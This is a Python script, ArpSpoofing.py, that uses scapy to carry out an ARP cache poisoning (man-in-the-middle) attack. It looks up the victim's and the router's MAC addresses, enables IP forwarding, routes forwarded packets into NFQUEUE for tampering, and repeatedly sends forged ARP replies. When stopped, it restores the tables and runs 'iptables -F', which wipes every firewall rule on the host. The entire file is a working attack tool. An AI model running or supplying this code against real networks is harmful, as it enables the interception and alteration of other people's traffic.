# Suppresses the WARNING Message
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

import argparse
import regex
from scapy.all import *
from scapy.layers.l2 import arping
import LocalNetworkScan as Scan

# General variables
interface = ""
victimIP = ""
routerIP = ""

# Turns on or off scapy messages
verbose = 0

# Variables for MAC address
victimMAC = None
routerMAC = None



def print_force(string):
    """This method is required because when this python file is called as a script
    the prints don't appear and a flush is required """

    if verbose is 1:
        print(string)
        sys.stdout.flush()


def grab_MAC(IP):
    """Manipulates the packet layers to obtain the MAC address from the returned values"""

    ans, uans = arping(IP, verbose=verbose)
    for s, r in ans:
        return r[Ether].src


def grab_MAC_Addresses():
    """Method that grabs the victim and router MAC addresses and stores them"""

    global victimMAC
    global routerMAC
    victimMAC = grab_MAC(victimIP)
    routerMAC = grab_MAC(routerIP)

    if victimMAC is not None and routerMAC is not None:
        loop = False
        print("[!] MAC Addresses obtain successfully - ARP spoof starting!", flush=True)
        print_force("[*] Router mac: \'{}\'".format(routerMAC))
        print_force("[*] Victim mac: \'{}\'".format(victimMAC))
    else:
        exit("[!] Error obtaining MAC Addresses, Arp spoofing stopped!")


def spoof(routerIP, victimIP):
    """Used to send out the packets to perform the spoof"""

    # Sends the arp replies
    #   "op = 2" - '2' is the opcode for a reply

    print_force("[*] Spoofing")
    send(ARP(op=2, pdst=victimIP, psrc=routerIP, hwdst=victimMAC), verbose=verbose)
    send(ARP(op=2, pdst=routerIP, psrc=victimIP, hwdst=routerMAC), verbose=verbose)


def restore(routerIP, victimIP):
    """Used to restore the arp table to the original format"""

    # Restores the original config
    send(ARP(op=2, pdst=routerIP, psrc=victimIP, hwdst="ff:ff:ff:ff:ff:ff",
             hwsrc=victimMAC), count=4, verbose=verbose)

    send(ARP(op=2, pdst=victimIP, psrc=routerIP, hwdst="ff:ff:ff:ff:ff:ff",
             hwsrc=routerMAC), count=4, verbose=verbose)


def set_ip_forward(state):
    """Method used to configure the host packet forwarding"""

    if state is True:

        print('[*] ', end='', flush=True)
        # This config has been tested only on Arch linux
        os.system("sysctl net.ipv4.ip_forward=1")

        # Pushes the forwarded packets into the NFQUEUE so the Packet.py can take affect
        os.system("iptables -A FORWARD -j NFQUEUE")

    else:
        os.system("sysctl net.ipv4.ip_forward=0")
        os.system("iptables -F")


def run():
    """Main loop method"""

    try:
        grab_MAC_Addresses()
        set_ip_forward(True)

        # Grabs all active hosts
        activeHosts = Scan.scan_for_active_hosts()
        print('[!] Grabbing hosts successful, there are {} hosts'.format(len(activeHosts)))

        while True:

            # Loops round and changes values for all hosts
            for host in activeHosts:
                spoof(host, victimIP)

            time.sleep(5)

    except KeyboardInterrupt:
        print_force("\n[!] Spoofing stopped!")
        restore(routerIP, victimIP)
        set_ip_forward(False)
        sys.exit(0)


def arp_spoof_external(inter, victim, router):
    """This allows this script to be run from another module"""

    global interface, victimIP, routerIP

    interface = inter
    victimIP = victim
    routerIP = router

    run()


def valid_ip(ip_address):
    """This function uses regex to check if the IP address parameters are correct.
    It validates the range 0.0.0.0 -> 255.255.255.255"""

    # Regular expression pattern matching for IP addresses
    pattern = \
        "(((2[0-5][0-5])|(1[0-9][0-9])|([0-9][0-9])|([0-9]))\.){3}(((2[0-5][0-5])|(1[0-9][0-9])|([0-9][0-9])|([0-9])))"

    # Pattern match
    if not regex.match(pattern, ip_address):
        print_force("[!] Error: Invalid IP please check your parameters!")
        sys.exit(1)


def parameters():
    """Method deals with parameters passed into the script"""

    global victimIP
    global routerIP
    global interface
    global verbose

    parser = argparse.ArgumentParser(prog="ArpSpoofing.py")
    parser.add_argument('-t', action='store', help='Specifies the target IP', metavar='Target_IP', required=True)
    parser.add_argument('-r', action='store', help='Specifies the router IP', metavar='Router_IP',  required=True)
    parser.add_argument('-i', action='store', help='Specifies the interface', metavar='Interface', required=True)
    parser.add_argument('-v', action='store_true', help='Sets the verbosity mode to on')
    args = parser.parse_args()

    if args.t:
        victimIP = args.t
    if args.r:
        routerIP = args.r
    if args.i:
        interface = args.i
    if args.v:
        verbose = 1

    # Validation
    valid_ip(victimIP)
    valid_ip(routerIP)

    print_force('[*] Arp Spoofing beginning!')
    run()


# Check if user is root
if os.getuid() != 0:
    exit("Error: User needs to be root to run this script")


if __name__ == "__main__":
    parameters()
